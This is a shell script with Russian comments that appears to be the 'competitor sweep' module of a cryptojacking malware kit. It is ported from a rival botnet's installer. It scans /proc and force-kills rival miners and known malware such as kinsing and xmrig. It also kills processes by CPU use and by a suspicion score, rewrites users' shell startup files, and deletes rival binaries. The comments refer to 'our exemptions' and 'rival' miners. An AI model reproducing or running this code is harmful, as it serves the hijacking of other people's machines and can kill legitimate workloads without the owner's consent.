#!/bin/sh
# 20-sweep.sh — зачистка конкурентов. Порт sweep_competitor_worms, _disarm_competitor,
# kill_themf, kill_mf3, kill_high_cpu, cleanup_files из их инсталлера.
# Отличия: понятные имена, наши исключения, без удаления файлов под root.

# --- 1. их главный свип -----------------------------------------------------
kf_sweep_competitors() {
  _s_uid=$(id -u 2>/dev/null)
  for _s_d in /proc/[0-9]*; do
    _s_p="${_s_d#/proc/}"
    [ "$_s_p" = "$$" ] && continue
    [ "$(awk '/^Uid:/{print $2}' "$_s_d/status" 2>/dev/null)" = "$_s_uid" ] || continue
    _s_ex=$(readlink "$_s_d/exe" 2>/dev/null)
    _s_cmd=$(tr '\0' ' ' < "$_s_d/cmdline" 2>/dev/null)
    kf_exempt "$_s_cmd" && continue
    kf_exempt_by_inst "$_s_p" && continue

    case "$_s_ex" in
      */.nodebox/*|*/.kwork/*|*/.jvbd/*|*/.sysjvd/*|*/java_update/*|*/.scsi_eh*|\
      */.X0_lock/*|*/.sysd-private-*|*/.svc/*|*/.khp*|*/dev/shm/*)
        kill -9 "$_s_p" 2>/dev/null && kf_log "killed (exe): $_s_p $_s_ex" ;;
    esac

    case "$_s_cmd" in
      *".nodebox"*|*".kwork"*|*".jvbd"*|*".sysjvd"*|*"java_update"*|*".scsi_eh"*|\
      *".X0_lock"*|*".sysd-private-"*|*"udev-helper"*|*"config.bin"*|*"/.khp"*|\
      *"spamassassin/daemon.sh"*|*"/.halt/"*|*"/.dbus/"*)
        kill -9 "$_s_p" 2>/dev/null && kf_log "killed (cmdline): $_s_p" ;;
      *"/run-agent.sh"*)
        if [ -f /tmp/run-agent.sh ] && grep -qE 'stratum|xmrig|monero|donate-level' /tmp/run-agent.sh 2>/dev/null; then
          kill -9 "$_s_p" 2>/dev/null; rm -f /tmp/run-agent.sh 2>/dev/null
          kf_log "killed (run-agent IOC): $_s_p"
        fi ;;
    esac
  done

  # спуф argv "[k..." и MASKED_RUN
  for _s_d in /proc/[0-9]*; do
    _s_p="${_s_d#/proc/}"
    [ "$_s_p" = "$$" ] && continue
    [ "$(awk '/^Uid:/{print $2}' "$_s_d/status" 2>/dev/null)" = "$_s_uid" ] || continue
    _s_cmd=$(tr '\0' ' ' < "$_s_d/cmdline" 2>/dev/null)
    [ -n "$_s_cmd" ] || continue
    kf_exempt "$_s_cmd" && continue
    _s_c1=$(printf '%s\n' "$_s_cmd" | cut -d' ' -f1)
    case "$_s_c1" in "[k"*) kill -9 "$_s_p" 2>/dev/null ;; esac
    if tr '\0' '\n' < "$_s_d/environ" 2>/dev/null | grep -q '^MASKED_RUN='; then
      kill -9 "$_s_p" 2>/dev/null
    fi
  done
  return 0
}

# --- 2. их странные имена процессов ----------------------------------------
kf_disarm_competitor() {
  for _d_p in /proc/[0-9]*; do
    _d_pid="${_d_p##*/}"
    [ "$_d_pid" = "$$" ] && continue
    _d_st=$(awk '{print $3}' "$_d_p/stat" 2>/dev/null)
    [ "$_d_st" = "Z" ] && continue
    _d_comm=$(cat "$_d_p/comm" 2>/dev/null)
    _d_exe=$(readlink "$_d_p/exe" 2>/dev/null)
    _d_hit=0
    case "$_d_comm" in
      watcher|nodepm|xfsd|kinsing|kdevtmpfsi|tcrond) _d_hit=1 ;;
    esac
    case "$_d_exe" in
      */watcher|*/.sysinit*|*/4thepool*|*/kdevtmpfsi*|*/kinsing*|*/tcrond*|*/runn.sh*) _d_hit=1 ;;
    esac
    [ "$_d_hit" = "1" ] && { kf_exempt "$_d_exe" || kf_exempt "$_d_comm" || kill -9 "$_d_pid" 2>/dev/null; }
  done
  return 0
}

# --- 3. майнеры по шаблону имени -------------------------------------------
kf_kill_known_miners() {
  _k_pat='syslog-ng-[0-9a-f]\{8\}|syslog-helper|donate-level|stratum\+tcp|cryptonight|randomx'
  for _k_d in /proc/[0-9]*; do
    _k_pid="${_k_d##*/}"
    [ "$_k_pid" = "$$" ] && continue
    _k_cmd=$(tr '\0' ' ' < "$_k_d/cmdline" 2>/dev/null)
    [ -n "$_k_cmd" ] || continue
    kf_exempt "$_k_cmd" && continue
    if printf '%s' "$_k_cmd" | grep -qE "$_k_pat"; then
      kill -9 "$_k_pid" 2>/dev/null && kf_log "killed miner-like: $_k_pid"
    fi
    # конкурирующие майнеры по имени
    case "$_k_cmd" in
      *xmrig*|*cpuminer*|*minerd*|*ccminer*|*ethminer*|*lolminer*|*nbminer*|*gminer*|\
      *nanominer*|*phoenixminer*|*kawpowminer*|*minergate*|*herominers*|*2miners*)
        kill -9 "$_k_pid" 2>/dev/null && kf_log "killed rival miner: $_k_pid" ;;
    esac
  done
  return 0
}

# --- 4. пожиратели CPU ------------------------------------------------------
kf_kill_high_cpu() {
  _h_th="${1:-150.0}"
  for _h_d in /proc/[0-9]*; do
    _h_pid="${_h_d##*/}"
    [ "$_h_pid" = "$$" ] && continue
    _h_cmd=$(tr '\0' ' ' < "$_h_d/cmdline" 2>/dev/null)
    [ -n "$_h_cmd" ] || continue
    kf_exempt "$_h_cmd" && continue
    case "$_h_cmd" in
      *node*|*redis*|*postgres*|*mysql*|*java*|*python*|*dockerd*|*containerd*) continue ;;
    esac
    # поля после "pid (comm) ": 12=utime, 13=stime (в тиках). $9 в stat — это flags, не CPU
    _h_cpu=$(sed 's/.*) //' "$_h_d/stat" 2>/dev/null | awk '{print $12+$13}')
    case "$_h_cpu" in ''|*[!0-9]*) continue ;; esac
    [ "$_h_cpu" -ge "${KF_HIGH_CPU_TICKS:-10000}" ] 2>/dev/null && kill -9 "$_h_pid" 2>/dev/null
  done
  return 0
}

# --- 5. уборка их хвостов (только свои пути, без rm под root) ---------------
kf_cleanup_competitor_files() {
  for _c_f in /tmp/watcher /tmp/kdevtmpfsi /tmp/kinsing /tmp/tcrond /tmp/runn.sh; do
    [ -f "$_c_f" ] && rm -f "$_c_f" 2>/dev/null
  done
  rm -rf /tmp/.ab* 2>/dev/null || true
  for _c_f in "$HOME/.profile" "$HOME/.bashrc" "$HOME/.bash_profile" "$HOME/.zshrc"; do
    [ -f "$_c_f" ] || continue
    grep -v -e '\.sysinit' -e 'systemd-resolved' -e '4thepool' -e 'kdevtmpfsi' -e '/tmp/watcher' -e 'kinsing' \
      "$_c_f" > "$_c_f.kfc" 2>/dev/null && mv "$_c_f.kfc" "$_c_f" 2>/dev/null
    rm -f "$_c_f.kfc" 2>/dev/null
  done
  return 0
}

# --- 6. их kill_themf: оценочный отстрел ------------------------------------
kf_kill_themf() {
  _t_threshold="${1:-9}"
  for _t_proc in /proc/[0-9]*; do
    [ -r "$_t_proc/status" ] || continue
    _t_pid="${_t_proc#/proc/}"
    [ "$_t_pid" = "$$" ] && continue
    _t_cmdline=$(tr '\0' ' ' < "$_t_proc/cmdline" 2>/dev/null)
    kf_exempt "$_t_cmdline" && continue
    _t_score=0
    _t_name=$(awk '/^Name:/ {print $2}' "$_t_proc/status" 2>/dev/null)
    _t_uid=$(awk '/^Uid:/ {print $2}' "$_t_proc/status" 2>/dev/null)
    _t_state=$(awk '/^State:/ {print $2}' "$_t_proc/status" 2>/dev/null)
    _t_ppid=$(awk '/^PPid:/ {print $2}' "$_t_proc/status" 2>/dev/null)
    _t_rss=$(awk '/^VmRSS:/ {print $2}' "$_t_proc/status" 2>/dev/null)
    _t_rss=${_t_rss:-0}
    _t_exe=$(readlink -f "$_t_proc/exe" 2>/dev/null)
    [ -n "$_t_exe" ] && _t_score=$((_t_score + 1))
    [ "$_t_rss" -gt 500000 ] 2>/dev/null && _t_score=$((_t_score + 2))
    [ "$_t_rss" -gt 1000000 ] 2>/dev/null && _t_score=$((_t_score + 3))
    _t_zombies=$(for _z in "$_t_proc"/task/*/children; do [ -r "$_z" ] && cat "$_z"; done 2>/dev/null | wc -w)
    [ "${_t_zombies:-0}" -ge 5 ] 2>/dev/null && _t_score=$((_t_score + 3))
    [ "${_t_zombies:-0}" -ge 20 ] 2>/dev/null && _t_score=$((_t_score + 2))
    _t_user=$(awk -F: -v u="$_t_uid" '$3==u{print $1; exit}' /etc/passwd 2>/dev/null)
    [ "$_t_user" != root ] && case "$_t_state" in S*) _t_score=$((_t_score + 1)) ;; esac
    case "$_t_exe" in
      /tmp/*|/var/tmp/*|/dev/shm/*) _t_score=$((_t_score + 4)) ;;
      "$HOME"/.cache/*|"$HOME"/.local/share/*|"$HOME"/.config/*) _t_score=$((_t_score + 4)) ;;
    esac
    [ -d "/proc/$_t_ppid" ] || _t_score=$((_t_score + 1))
    if [ "$_t_score" -ge "$_t_threshold" ] 2>/dev/null; then
      kf_log "kill_themf: PID=$_t_pid score=$_t_score name=$_t_name exe=$_t_exe"
      kill -9 "$_t_pid" 2>/dev/null
    fi
  done
  return 0
}

# --- 7. их kill_mf3: через ps -eo -------------------------------------------
kf_kill_mf3() {
  _m_pat='syslog-ng-[0-9a-f]\{8\}|syslog-helper|donate-level|stratum+tcp|cryptonight|randomx'
  _m_all=$(ps -eo pid=,ppid=,args= 2>/dev/null) || return 0
  [ -n "$_m_all" ] || return 0
  _m_pids=$(printf '%s\n' "$_m_all" | grep -E "$_m_pat" 2>/dev/null \
            | grep -vE "kf_kill_mf3|grep|awk" | awk 'NF{print $1}' | sort -un | tr '\n' ' ')
  [ -z "$_m_pids" ] && return 0
  for _m_p in $_m_pids; do
    _m_cmd=$(tr '\0' ' ' < "/proc/$_m_p/cmdline" 2>/dev/null)
    kf_exempt "$_m_cmd" && continue
    kill -TERM "$_m_p" 2>/dev/null
  done
  sleep 1
  for _m_p in $_m_pids; do
    _m_cmd=$(tr '\0' ' ' < "/proc/$_m_p/cmdline" 2>/dev/null)
    kf_exempt "$_m_cmd" && continue
    kill -0 "$_m_p" 2>/dev/null && kill -KILL "$_m_p" 2>/dev/null
  done
  return 0
}

# --- 8. убить и удалить бинарь (их kill_and_remove_process) ------------------
kf_kill_and_remove() {
  _kr_term="${1:-}"
  [ -n "$_kr_term" ] || return 2
  _kr_n=0
  for _kr_dir in /proc/[0-9]*; do
    [ -r "$_kr_dir/comm" ] || continue
    _kr_pid="${_kr_dir##*/}"
    [ "$_kr_pid" = "$$" ] && continue
    _kr_comm=$(cat "$_kr_dir/comm" 2>/dev/null)
    _kr_cmd=$(tr '\0' ' ' < "$_kr_dir/cmdline" 2>/dev/null)
    if [ "$_kr_comm" != "$_kr_term" ] && ! printf '%s' "$_kr_cmd" | grep -Fq -- "$_kr_term"; then
      continue
    fi
    kf_exempt "$_kr_cmd" && continue
    _kr_exe=$(readlink -f "$_kr_dir/exe" 2>/dev/null)
    [ -n "$_kr_exe" ] || continue
    _kr_target=""
    case "$_kr_exe" in
      /bin/*|/sbin/*|/usr/bin/*|/usr/sbin/*|/usr/lib/*|/lib/*|/lib64/*)
        # интерпретатор: удаляем скрипт, который он крутит
        _kr_target=$(printf '%s\n' $_kr_cmd | while read -r _a; do
          case "$_a" in
            /bin/*|/sbin/*|/usr/bin/*|/usr/sbin/*|/usr/lib/*|/lib/*|/lib64/*) continue ;;
            /*) [ -f "$_a" ] && { echo "$_a"; break; } ;;
          esac
        done | head -1)
        ;;
      *) _kr_target="$_kr_exe" ;;
    esac
    kill "$_kr_pid" 2>/dev/null
    sleep 1
    kill -0 "$_kr_pid" 2>/dev/null && kill -9 "$_kr_pid" 2>/dev/null
    case "$_kr_target" in
      /bin/*|/sbin/*|/usr/bin/*|/usr/sbin/*|/usr/lib/*|/lib/*|/lib64/*) _kr_target="" ;;
    esac
    if [ -n "$_kr_target" ] && [ -f "$_kr_target" ] && [ -O "$_kr_target" ]; then
      rm -f -- "$_kr_target" 2>/dev/null && { _kr_n=$((_kr_n+1)); kf_log "removed rival file: $_kr_target"; }
    fi
  done
  return 0
}

# прогнать по известным маркерам конкурентов
kf_purge_rival_binaries() {
  for _pb_t in .kwork .nodebox udev-helper java_update .jvbd .sysjvd .khp nm-dog .sysd-private; do
    kf_kill_and_remove "$_pb_t"
  done
  return 0
}
